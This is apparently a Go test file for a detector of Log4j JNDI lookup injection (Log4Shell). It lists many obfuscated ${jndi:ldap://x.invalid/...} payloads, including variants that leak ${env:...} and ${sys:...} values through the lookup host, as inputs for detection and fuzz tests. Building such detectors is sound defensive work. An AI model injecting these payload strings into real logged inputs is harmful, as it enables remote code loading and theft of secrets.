package engine

import (
	"reflect"
	"strconv"
	"strings"
	"testing"
)

func TestResolveFindsJNDI(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		wantScheme string
		wantKey    string
		obfuscated bool
	}{
		{"plain", "${jndi:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", false},
		{"upper case everywhere", "${JNDI:LDAP://x.invalid/a}", "ldap", "LDAP://x.invalid/a", false},
		{"mixed case", "${JnDi:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", false},
		{"lower lookups", "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"upper lookups", "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"colon-dash defaults", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"empty-name defaults", "${${:-j}${:-n}${:-d}${:-i}:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"env default", "${${env:NaN:-j}ndi:rmi://x.invalid/a}", "rmi", "rmi://x.invalid/a", true},
		{"sys default", "${${sys:zz.unset:-j}${sys:zz.unset:-n}di:dns://x.invalid/a}", "dns", "dns://x.invalid/a", true},
		{"date quoted literals", "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"partial obfuscation", "${j${::-n}di:iiop://x.invalid/a}", "iiop", "iiop://x.invalid/a", true},
		{"obfuscated scheme only", "${jndi:${lower:L}dap://x.invalid/a}", "ldap", "ldap://x.invalid/a", false},
		{"dotless i via upper", "${jnd${upper:\u0131}:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"nested double", "${${lower:${upper:j}}ndi:ldap://x.invalid/a}", "ldap", "ldap://x.invalid/a", true},
		{"ldaps with port", "${jndi:ldaps://x.invalid:636/a}", "ldaps", "ldaps://x.invalid:636/a", false},
		{"default delimiter strips tail", "${jndi:ldap://x.invalid/a:-b}", "ldap", "ldap://x.invalid/a", false},
		{"no scheme", "${jndi:x}", "", "x", false},
		{"empty key", "${jndi:}", "", "", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			res := Resolve(tc.input, Limits{})
			if !res.Complete() {
				t.Fatalf("Exhausted = %v", res.Exhausted)
			}
			if len(res.Findings) != 1 {
				t.Fatalf("got %d findings %+v, want 1", len(res.Findings), res.Findings)
			}
			f := res.Findings[0]
			if f.Kind != FindingJNDI {
				t.Errorf("Kind = %v, want jndi", f.Kind)
			}
			if f.Scheme != tc.wantScheme {
				t.Errorf("Scheme = %q, want %q", f.Scheme, tc.wantScheme)
			}
			if f.Key != tc.wantKey {
				t.Errorf("Key = %q, want %q", f.Key, tc.wantKey)
			}
			if f.Obfuscated != tc.obfuscated {
				t.Errorf("Obfuscated = %v, want %v", f.Obfuscated, tc.obfuscated)
			}
		})
	}
}

// unescapeU turns the two-byte sequence backslash,u followed by four hex digits
// into the rune it names. Test inputs use it so the source stays readable.
func unescapeU(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); {
		if i+6 <= len(s) && s[i] == '\\' && s[i+1] == 'u' {
			if v, err := strconv.ParseUint(s[i+2:i+6], 16, 32); err == nil {
				b.WriteRune(rune(v))
				i += 6
				continue
			}
		}
		b.WriteByte(s[i])
		i++
	}
	return b.String()
}

// TestResolveObfuscationMatrix builds the prefix and the scheme out of every
// combination of per-character encoders and requires each one to be detected.
func TestResolveObfuscationMatrix(t *testing.T) {
	encoders := []struct {
		name string
		fn   func(c string) string
		lit  bool // leaves the character literally present (not obfuscated)
	}{
		{"literal", func(c string) string { return c }, true},
		{"literal-upper", strings.ToUpper, true},
		{"lower-of-upper", func(c string) string { return "${lower:" + strings.ToUpper(c) + "}" }, false},
		{"upper", func(c string) string { return "${upper:" + c + "}" }, false},
		{"colon-dash", func(c string) string { return "${::-" + c + "}" }, false},
		{"empty-name", func(c string) string { return "${:-" + c + "}" }, false},
		{"env-default", func(c string) string { return "${env:ZZ_UNSET:-" + c + "}" }, false},
		{"sys-default", func(c string) string { return "${sys:zz.unset:-" + c + "}" }, false},
		{"java-default", func(c string) string { return "${java:zz:-" + c + "}" }, false},
		{"date-quoted", func(c string) string { return "${date:'" + c + "'}" }, false},
		{"lower-upper", func(c string) string { return "${lower:${upper:" + c + "}}" }, false},
		{"default-default", func(c string) string { return "${::-${::-" + c + "}}" }, false},
		{"unknown-handler-default", func(c string) string { return "${nosuch:x:-" + c + "}" }, false},
	}
	n := len(encoders)
	prefix := []string{"j", "n", "d", "i"}
	scheme := []string{"l", "d", "a", "p"}

	combos := 1
	for range prefix {
		combos *= n
	}
	for idx := 0; idx < combos; idx++ {
		var pb, sb strings.Builder
		allLiteral := true
		rest := idx
		for k, c := range prefix {
			e := encoders[rest%n]
			rest /= n
			pb.WriteString(e.fn(c))
			allLiteral = allLiteral && e.lit
			// Rotate the scheme encoders so both parts vary across the matrix.
			sb.WriteString(encoders[(idx+k*3+1)%n].fn(scheme[k]))
		}
		input := "${" + pb.String() + ":" + sb.String() + "://x.invalid/a}"

		res := Resolve(input, Limits{})
		if !res.Complete() {
			t.Fatalf("%s: Exhausted = %v", input, res.Exhausted)
		}
		if len(res.Findings) != 1 {
			t.Fatalf("%s: got %d findings, want 1", input, len(res.Findings))
		}
		f := res.Findings[0]
		if f.Kind != FindingJNDI || f.Scheme != "ldap" || strings.ToLower(f.Key) != "ldap://x.invalid/a" {
			t.Fatalf("%s: finding = %+v", input, f)
		}
		if f.Obfuscated == allLiteral {
			t.Fatalf("%s: Obfuscated = %v, want %v", input, f.Obfuscated, !allLiteral)
		}
	}
}

func TestResolveBenignInputs(t *testing.T) {
	tests := []string{
		"",
		"plain text with no lookups",
		"Hello ${name}!",
		"${HOME}",
		"${user.name}",
		"${}",
		"echo ${VAR:-default}",
		"const s = `${a}-${b}`",
		"${env:HOME}",
		"${sys:user.name}",
		"${java:version}",
		"${date:yyyy-MM-dd}",
		"${lower:ABC}",
		"${upper:jndi:ldap://x.invalid/a}",
		"${lower:JNDI}",
		"${ not closed",
		"${ jndi:ldap://x.invalid/a}",
		"$ {jndi:ldap://x.invalid/a}",
		"{jndi:ldap://x.invalid/a}",
		"$jndi:ldap://x.invalid/a",
		"jndi:ldap://x.invalid/a",
		"${jnd:ldap://x.invalid/a}",
		"${jndii:ldap://x.invalid/a}",
		"${xjndi:ldap://x.invalid/a}",
		"${jnd\u0131:ldap://x.invalid/a}",
		"${\uFFFFndi:ldap://x.invalid/a}",
		"${date:j}",
		"${j${lower:${upper:\uFB01}}:ldap://x.invalid/a}",
		"${${date:j}ndi:ldap://x.invalid/a}",
		"${C:\\Users\\x}",
		"}}}${{{",
		"$${",
		"${",
		"$",
	}
	for _, in := range tests {
		in = unescapeU(in)
		res := Resolve(in, Limits{})
		if !res.Complete() {
			t.Errorf("%q: Exhausted = %v", in, res.Exhausted)
		}
		if len(res.Findings) != 0 {
			t.Errorf("%q: unexpected findings %+v", in, res.Findings)
		}
	}
}

func TestResolveEmbeddedAndMultiple(t *testing.T) {
	prefix := "User-Agent: Mozilla/5.0 "
	payload := "${jndi:ldap://a.invalid/x}"
	res := Resolve(prefix+payload+" trailing }", Limits{})
	if len(res.Findings) != 1 || res.Findings[0].Offset != len(prefix) {
		t.Fatalf("findings = %+v, want one at offset %d", res.Findings, len(prefix))
	}

	two := payload + "${jndi:rmi://b.invalid/y}"
	res = Resolve(two, Limits{})
	if len(res.Findings) != 2 {
		t.Fatalf("got %d findings, want 2", len(res.Findings))
	}
	if res.Findings[0].Offset != 0 || res.Findings[1].Offset != len(payload) {
		t.Errorf("offsets = %d, %d", res.Findings[0].Offset, res.Findings[1].Offset)
	}
	if res.Findings[0].Scheme != "ldap" || res.Findings[1].Scheme != "rmi" {
		t.Errorf("schemes = %q, %q", res.Findings[0].Scheme, res.Findings[1].Scheme)
	}
}

func TestResolveSurroundingTextDoesNotHideAPayload(t *testing.T) {
	payloads := []string{
		"${jndi:ldap://x.invalid/a}",
		"${${lower:j}ndi:ldap://x.invalid/a}",
		"${${::-j}${::-n}${::-d}${::-i}:ldap://x.invalid/a}",
	}
	wrappers := []string{"", "a", "{", "}", "{{", "}}", "$", "$$", "x y z ", "} {", "\n", "%", "\\"}
	for _, p := range payloads {
		for _, pre := range wrappers {
			for _, post := range wrappers {
				in := pre + p + post
				res := Resolve(in, Limits{})
				if len(res.Findings) == 0 {
					t.Errorf("payload hidden by wrapping %q", in)
				}
			}
		}
	}
}

func TestResolveEscapeIsNotHonored(t *testing.T) {
	// Log4j treats "$${" as a literal "${", but a second pass elsewhere in the
	// pipeline may expand it, so the inner lookup is still reported.
	res := Resolve("$${jndi:ldap://x.invalid/a}", Limits{})
	if len(res.Findings) != 1 || res.Findings[0].Offset != 1 {
		t.Fatalf("findings = %+v, want one at offset 1", res.Findings)
	}
}

func TestResolveUnterminated(t *testing.T) {
	res := Resolve("${jndi:ldap://x.invalid/a", Limits{})
	if len(res.Findings) != 1 || !res.Findings[0].Unterminated {
		t.Fatalf("findings = %+v, want one unterminated finding", res.Findings)
	}
	if res.Findings[0].Key != "ldap://x.invalid/a" {
		t.Errorf("Key = %q", res.Findings[0].Key)
	}

	nested := Resolve("${${lower:j}ndi:ldap://x.invalid/a", Limits{})
	if len(nested.Findings) != 1 || !nested.Findings[0].Unterminated {
		t.Fatalf("nested: findings = %+v", nested.Findings)
	}

	closed := Resolve("${jndi:ldap://x.invalid/a}", Limits{})
	if closed.Findings[0].Unterminated {
		t.Error("a closed lookup must not be marked unterminated")
	}
}

func TestResolveReexpansion(t *testing.T) {
	// ${::-$} yields "$", so lower sees "${JNDI:...}" and returns "${jndi:...}".
	// Log4j re-scans that result, so the lookup it contains must be found.
	res := Resolve("${lower:${::-$}{JNDI:ldap://x.invalid/a}}", Limits{})
	if len(res.Findings) != 1 {
		t.Fatalf("findings = %+v, want 1", res.Findings)
	}
	f := res.Findings[0]
	if !f.Expanded || f.Depth < 1 || f.Scheme != "ldap" {
		t.Errorf("finding = %+v, want an expanded, nested ldap finding", f)
	}
}

func TestResolveExfiltrationKeyLookups(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
		key   string
	}{
		{"env in host", "${jndi:ldap://${env:SECRET_VAR}.x.invalid/a}", []string{"env"}, "ldap://?.x.invalid/a"},
		{"sys and env", "${jndi:ldap://${sys:java.version}.${env:USER}.x.invalid/a}", []string{"sys", "env"}, "ldap://?.?.x.invalid/a"},
		{"wrapped in lower", "${jndi:ldap://${lower:${env:USER}}.x.invalid/a}", []string{"env"}, "ldap://?.x.invalid/a"},
		{"env with default still counts", "${jndi:ldap://${env:HOST:-x.invalid}/a}", []string{"env"}, "ldap://x.invalid/a"},
		{"no environment lookup", "${jndi:ldap://${lower:X}.invalid/a}", nil, "ldap://x.invalid/a"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			res := Resolve(tc.input, Limits{})
			if len(res.Findings) != 1 {
				t.Fatalf("findings = %+v", res.Findings)
			}
			f := res.Findings[0]
			if !reflect.DeepEqual(f.KeyLookups, tc.want) {
				t.Errorf("KeyLookups = %v, want %v", f.KeyLookups, tc.want)
			}
			if f.Key != tc.key {
				t.Errorf("Key = %q, want %q", f.Key, tc.key)
			}
		})
	}
}

func TestResolvePossibleJNDI(t *testing.T) {
	positives := []string{
		"${${env:SOMETHING}ndi:ldap://x.invalid/a}",
		"${j${env:A}di:ldap://x.invalid/a}",
		"${jn${sys:a}:ldap://x.invalid/a}",
		"${${java:a}${env:B}di:ldap://x.invalid/a}",
	}
	for _, in := range positives {
		res := Resolve(in, Limits{})
		if len(res.Findings) != 1 || res.Findings[0].Kind != FindingPossibleJNDI {
			t.Errorf("%q: findings = %+v, want one possible-jndi", in, res.Findings)
			continue
		}
		if !res.Findings[0].Obfuscated {
			t.Errorf("%q: possible-jndi should be Obfuscated", in)
		}
	}

	negatives := []string{
		"${${env:A}${env:B}:ldap://x.invalid/a}",
		"${${env:A}n:foo}",
		"${${env:A}xyz:foo}",
		"${${env:A}:foo}",
		"${env:A}",
	}
	for _, in := range negatives {
		res := Resolve(in, Limits{})
		if len(res.Findings) != 0 {
			t.Errorf("%q: unexpected findings %+v", in, res.Findings)
		}
	}
}

func TestResolveLookupSummaries(t *testing.T) {
	res := Resolve("${lower:A}${env:HOME:-x}${name}${${::-l}ower:B}", Limits{})
	if res.Total != 5 {
		t.Errorf("Total = %d, want 5 (placeholders and nested lookups included)", res.Total)
	}
	var prefixes []string
	for _, l := range res.Lookups {
		prefixes = append(prefixes, l.Prefix)
	}
	want := []string{"lower", "env", "", "lower"}
	if !reflect.DeepEqual(prefixes, want) {
		t.Fatalf("prefixes = %q, want %q", prefixes, want)
	}
	if !res.Lookups[1].HasDefault || res.Lookups[0].HasDefault {
		t.Errorf("HasDefault wrong: %+v", res.Lookups)
	}
	last := res.Lookups[3]
	if !last.Obfuscated || last.Depth != 0 || !last.Known {
		t.Errorf("last lookup = %+v, want a known, obfuscated, top-level lookup", last)
	}
	if res.MaxNesting != 2 {
		t.Errorf("MaxNesting = %d, want 2", res.MaxNesting)
	}
}

func TestResolveSentinelInInputIsNotTrusted(t *testing.T) {
	// A literal U+FFFF in the input must not be mistaken for an unknown marker.
	res := Resolve(unescapeU("${j\\uffffdi:ldap://x.invalid/a}"), Limits{})
	if len(res.Findings) != 0 {
		t.Fatalf("findings = %+v, want none", res.Findings)
	}
	for _, l := range res.Lookups {
		if !l.Known {
			t.Errorf("lookup %+v should be fully known", l)
		}
	}
}

func nest(n int) string {
	return strings.Repeat("${a:", n) + "x" + strings.Repeat("}", n)
}

func TestResolveNestingBoundary(t *testing.T) {
	if res := Resolve(nest(16), Limits{MaxNesting: 16}); res.Exhausted != BudgetNone {
		t.Fatalf("16 deep with MaxNesting 16: Exhausted = %v, want none", res.Exhausted)
	}
	res := Resolve(nest(17), Limits{MaxNesting: 16})
	if res.Exhausted != BudgetNesting {
		t.Fatalf("17 deep with MaxNesting 16: Exhausted = %v, want nesting", res.Exhausted)
	}
	if res.Complete() {
		t.Error("an exhausted resolution must not be Complete")
	}
}

func TestResolveDeepNestingDoesNotRecurseUnbounded(t *testing.T) {
	// A megabyte of openers must fail fast on the nesting budget.
	res := Resolve(strings.Repeat("${", 1<<19), Limits{})
	if res.Exhausted != BudgetNesting {
		t.Fatalf("Exhausted = %v, want nesting", res.Exhausted)
	}
}

func TestResolveLookupBudget(t *testing.T) {
	many := strings.Repeat("${lower:a}", 4)
	if res := Resolve(many, Limits{MaxLookups: 4}); res.Exhausted != BudgetNone {
		t.Fatalf("4 lookups, limit 4: Exhausted = %v, want none", res.Exhausted)
	}
	if res := Resolve(many, Limits{MaxLookups: 3}); res.Exhausted != BudgetLookups {
		t.Fatalf("4 lookups, limit 3: Exhausted = %v, want lookups", res.Exhausted)
	}

	// Parse sees two lookups, but re-expansion makes a third at evaluation time.
	reexp := "${lower:${::-$}{lower:x}}"
	if res := Resolve(reexp, Limits{MaxLookups: 3}); res.Exhausted != BudgetNone {
		t.Fatalf("re-expansion, limit 3: Exhausted = %v, want none", res.Exhausted)
	}
	if res := Resolve(reexp, Limits{MaxLookups: 2}); res.Exhausted != BudgetLookups {
		t.Fatalf("re-expansion, limit 2: Exhausted = %v, want lookups", res.Exhausted)
	}
}

func TestResolvePlaceholdersDoNotConsumeTheLookupBudget(t *testing.T) {
	// Template-heavy benign text (shell, JavaScript) is full of ${name}.
	body := strings.Repeat("${name} ", 10000)
	res := Resolve(body, Limits{MaxLookups: 8})
	if res.Exhausted != BudgetNone || res.Total != 10000 || len(res.Lookups) != 0 {
		t.Fatalf("Exhausted = %v, Total = %d, Lookups = %d", res.Exhausted, res.Total, len(res.Lookups))
	}
}

func TestResolveValueBytesBudget(t *testing.T) {
	if res := Resolve("${lower:aaaa}", Limits{MaxValueBytes: 10}); res.Exhausted != BudgetNone {
		t.Fatalf("name exactly at the limit: Exhausted = %v, want none", res.Exhausted)
	}
	if res := Resolve("${lower:aaaaa}", Limits{MaxValueBytes: 10}); res.Exhausted != BudgetValueBytes {
		t.Fatalf("name over the limit: Exhausted = %v, want value-bytes", res.Exhausted)
	}
	// The cap also applies to re-expanded text.
	big := "${lower:${::-$}{lower:" + strings.Repeat("a", 40) + "}}"
	if res := Resolve(big, Limits{MaxValueBytes: 64}); res.Exhausted != BudgetNone {
		t.Fatalf("re-expanded value within limit: Exhausted = %v", res.Exhausted)
	}
	if res := Resolve(big, Limits{MaxValueBytes: 40}); res.Exhausted != BudgetValueBytes {
		t.Fatalf("re-expanded value over limit: Exhausted = %v, want value-bytes", res.Exhausted)
	}
}

func TestResolveDeterministic(t *testing.T) {
	in := "x ${${env:A:-j}${lower:N}di:${::-l}dap://${env:B}.x.invalid/a} ${date:yyyy} ${jndi:rmi://y.invalid/b"
	if a, b := Resolve(in, Limits{}), Resolve(in, Limits{}); !reflect.DeepEqual(a, b) {
		t.Fatalf("Resolve is not deterministic:\n%+v\n%+v", a, b)
	}
}

func TestResolveFindingKeyIsTruncated(t *testing.T) {
	long := "${jndi:ldap://" + strings.Repeat("a", 1000) + "}"
	res := Resolve(long, Limits{})
	if len(res.Findings) != 1 || len(res.Findings[0].Key) > maxReportedKey {
		t.Fatalf("Key length = %d, want at most %d", len(res.Findings[0].Key), maxReportedKey)
	}
}

func TestFindingKindString(t *testing.T) {
	tests := map[FindingKind]string{
		FindingJNDI:         "jndi",
		FindingPossibleJNDI: "possible-jndi",
		FindingKind(0):      "unknown",
	}
	for k, want := range tests {
		if got := k.String(); got != want {
			t.Errorf("FindingKind(%d).String() = %q, want %q", int(k), got, want)
		}
	}
}

func TestDatePattern(t *testing.T) {
	tests := []struct {
		in     string
		want   string
		wantOK bool
	}{
		{"'j'", "j", true},
		{"'jn'", "jn", true},
		{"'a''b'", "a'b", true},
		{"''", "'", true},
		{"yyyy", unknownMark, true},
		{"yyyy-MM-dd", unknownMark + "-" + unknownMark + "-" + unknownMark, true},
		{"'x'yyyy'y'", "x" + unknownMark + "y", true},
		{"", unknownMark, true},
		{"j", "", false},
		{"'unterminated", "", false},
		{"'a'b", "", false},
		{"HH:mm", unknownMark + ":" + unknownMark, true},
		{"@#", "@#", true},
	}
	for _, tc := range tests {
		got, ok := datePattern(tc.in)
		if ok != tc.wantOK || got != tc.want {
			t.Errorf("datePattern(%q) = (%q, %v), want (%q, %v)", tc.in, got, ok, tc.want, tc.wantOK)
		}
	}
}

func TestJavaCaseFolding(t *testing.T) {
	lowerTests := []struct{ in, want string }{
		{"JNDI", "jndi"},
		{"JnDi", "jndi"},
		{"", ""},
		{unescapeU("\\u212A"), "k"}, // Kelvin sign
		{unescapeU("\\u0130"), "i" + unescapeU("\\u0307")}, // dotted capital I expands
		{unescapeU("\\u0131"), unescapeU("\\u0131")},       // dotless i is already lower case
		{unescapeU("caf\\u00C9"), unescapeU("caf\\u00E9")},
	}
	for _, tc := range lowerTests {
		if got := javaLower(tc.in); got != tc.want {
			t.Errorf("javaLower(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}

	upperTests := []struct{ in, want string }{
		{"jndi", "JNDI"},
		{unescapeU("\\u0131"), "I"}, // dotless i becomes ASCII I
		{unescapeU("\\u017F"), "S"}, // long s becomes ASCII S
		{unescapeU("\\u00DF"), "SS"},
		{unescapeU("\\u0149"), unescapeU("\\u02BCN")},
		{unescapeU("\\u01F0"), "J" + unescapeU("\\u030C")},
		{unescapeU("\\uFB00\\uFB01\\uFB02\\uFB03\\uFB04\\uFB05\\uFB06"), "FFFIFLFFIFFLSTST"},
		{unescapeU("caf\\u00E9"), unescapeU("CAF\\u00C9")},
	}
	for _, tc := range upperTests {
		if got := javaUpper(tc.in); got != tc.want {
			t.Errorf("javaUpper(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestCouldBeJNDI(t *testing.T) {
	u := unknownMark
	tests := []struct {
		in   string
		want bool
	}{
		{u + "ndi", true},
		{"j" + u + "di", true},
		{"jn" + u, true},
		{"j" + u + u + "i", true},
		{u + u + "di", true},
		{"jndi" + u, true}, // the unknown may be empty
		{u, false},
		{u + u, false},
		{u + "n", false},
		{u + "xyz", false},
		{"jndi", false}, // no unknown: handled as an exact match elsewhere
		{"x" + u + "ndi", false},
		{"jndiix" + u, false},
	}
	for _, tc := range tests {
		if got := couldBeJNDI(tc.in); got != tc.want {
			t.Errorf("couldBeJNDI(%q) = %v, want %v", display(tc.in), got, tc.want)
		}
	}
}

func TestValidScheme(t *testing.T) {
	for _, s := range []string{"ldap", "LDAPS", "a+b-c.d", "rmi2", "l" + unknownMark + "ap"} {
		if !validScheme(s) {
			t.Errorf("validScheme(%q) = false, want true", s)
		}
	}
	for _, s := range []string{"", "ld ap", "ldap/", "l_dap", "//"} {
		if validScheme(s) {
			t.Errorf("validScheme(%q) = true, want false", s)
		}
	}
}

func TestAddSources(t *testing.T) {
	got := addSources(nil, []string{"env", "sys", "env"})
	if !reflect.DeepEqual(got, []string{"env", "sys"}) {
		t.Errorf("addSources dedupe = %v", got)
	}
	var many []string
	for i := 0; i < 40; i++ {
		many = addSources(many, []string{strconv.Itoa(i)})
	}
	if len(many) != maxSources {
		t.Errorf("addSources cap = %d, want %d", len(many), maxSources)
	}
}

func TestResolveExhaustionPaths(t *testing.T) {
	// Openers that only appear after re-expansion exceed the nesting budget when
	// the expanded text is parsed.
	deepAfterExpansion := "${upper:${::-$}{a:${::-$}{a:${::-$}{a:${::-$}{a:x}}}}}"
	if res := Resolve(deepAfterExpansion, Limits{MaxNesting: 3}); res.Exhausted != BudgetNesting {
		t.Errorf("nesting after expansion: Exhausted = %v, want nesting", res.Exhausted)
	}

	// Unterminated openers are closed at the end of the text and still count.
	if res := Resolve("${a:${a:${a:", Limits{MaxLookups: 2}); res.Exhausted != BudgetLookups {
		t.Errorf("unterminated lookups over budget: Exhausted = %v, want lookups", res.Exhausted)
	}

	// A handler whose output grows past the cap is refused even though its name fit.
	grow := "${upper:" + strings.Repeat(unescapeU("\\u0149"), 7) + "}" // 2-byte runes become 3-byte
	if res := Resolve(grow, Limits{MaxValueBytes: 20}); res.Exhausted != BudgetValueBytes {
		t.Errorf("growing handler output: Exhausted = %v, want value-bytes", res.Exhausted)
	}

	// The same cap guards text assembled from several lookup values.
	root, _, _, b := parseLookups("aaaa${lower:b}", DefaultLimits(), false)
	if b != BudgetNone {
		t.Fatalf("parse: %v", b)
	}
	r := &resolver{lim: Limits{MaxValueBytes: 3}.withDefaults(), res: &Resolution{}}
	if got := r.evalParts(root, 0, true); got != "" || r.exhausted != BudgetValueBytes {
		t.Errorf("evalParts = %q, exhausted = %v, want empty and value-bytes", got, r.exhausted)
	}

	// A budget exhausted inside a nested lookup aborts the enclosing lookup too.
	// Parse sees three lookups, but expanding upper's result adds a fourth.
	if res := Resolve("${lower:${upper:${::-$}{lower:x}}}", Limits{MaxLookups: 3}); res.Exhausted != BudgetLookups {
		t.Errorf("exhaustion inside a nested lookup: Exhausted = %v, want lookups", res.Exhausted)
	}

	// Re-expansion depth is bounded independently of parse nesting.
	deep := &resolver{lim: DefaultLimits(), res: &Resolution{}}
	if got := deep.evalNode(root.parts[1].lookup, DefaultLimits().MaxNesting+1); got.val != "" || deep.exhausted != BudgetNesting {
		t.Errorf("evalNode past MaxNesting = %+v, exhausted = %v, want nesting", got, deep.exhausted)
	}

	// Once a budget is exhausted nothing further is evaluated.
	if got := r.evalNode(root.parts[1].lookup, 0); got.val != "" || len(r.res.Lookups) != 0 {
		t.Errorf("evalNode after exhaustion = %+v, lookups %d", got, len(r.res.Lookups))
	}
	if got := r.evalParts(root, 0, true); got != "" {
		t.Errorf("evalParts after exhaustion = %q, want empty", got)
	}
}

func FuzzResolve(f *testing.F) {
	seeds := []string{
		"", "${", "}", "$", "${}", "${jndi:ldap://x.invalid/a}",
		"${${lower:j}ndi:ldap://x.invalid/a}", "${${::-j}${::-n}${::-d}${::-i}:ldap://x.invalid/a}",
		"${${env:A:-j}ndi:rmi://x.invalid/a}", "${${date:'j'}ndi:ldap://x.invalid/a}",
		"${lower:${::-$}{JNDI:ldap://x.invalid/a}}", "${jndi:ldap://${env:X}.x.invalid/a",
		"$${jndi:x}", "${a:-${b:-${c:-d}}}", "${:-}", "${::-}", "${date:'", "${${env:A}ndi:x}",
		"${upper:" + unescapeU("\\u0131") + "}", "}}${{${",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	lim := Limits{MaxNesting: 8, MaxLookups: 64, MaxValueBytes: 2048}

	f.Fuzz(func(t *testing.T, in string) {
		res := Resolve(in, lim)

		if !strings.Contains(in, "${") {
			if res.Total != 0 || len(res.Lookups) != 0 || len(res.Findings) != 0 || res.Exhausted != BudgetNone {
				t.Fatalf("input without \"${\" must produce an empty resolution: %+v", res)
			}
			return
		}
		if len(res.Lookups) > lim.MaxLookups {
			t.Fatalf("%d lookups exceeds MaxLookups", len(res.Lookups))
		}
		if len(res.Findings) > len(res.Lookups) {
			t.Fatalf("%d findings from %d lookups", len(res.Findings), len(res.Lookups))
		}
		if res.MaxNesting > lim.MaxNesting+1 {
			t.Fatalf("MaxNesting %d far exceeds the limit", res.MaxNesting)
		}
		for _, fd := range res.Findings {
			if fd.Kind != FindingJNDI && fd.Kind != FindingPossibleJNDI {
				t.Fatalf("bad kind %v", fd.Kind)
			}
			if fd.Offset < 0 {
				t.Fatalf("negative offset %d", fd.Offset)
			}
			if !fd.Expanded && (fd.Offset+2 > len(in) || in[fd.Offset:fd.Offset+2] != "${") {
				t.Fatalf("offset %d does not point at \"${\" in %q", fd.Offset, in)
			}
			if len(fd.Key) > maxReportedKey {
				t.Fatalf("key of %d bytes exceeds the report cap", len(fd.Key))
			}
			if fd.Scheme != "" && !validScheme(strings.ReplaceAll(fd.Scheme, "?", unknownMark)) {
				t.Fatalf("invalid scheme %q", fd.Scheme)
			}
		}
		if again := Resolve(in, lim); !reflect.DeepEqual(res, again) {
			t.Fatalf("non-deterministic result for %q", in)
		}
	})
}
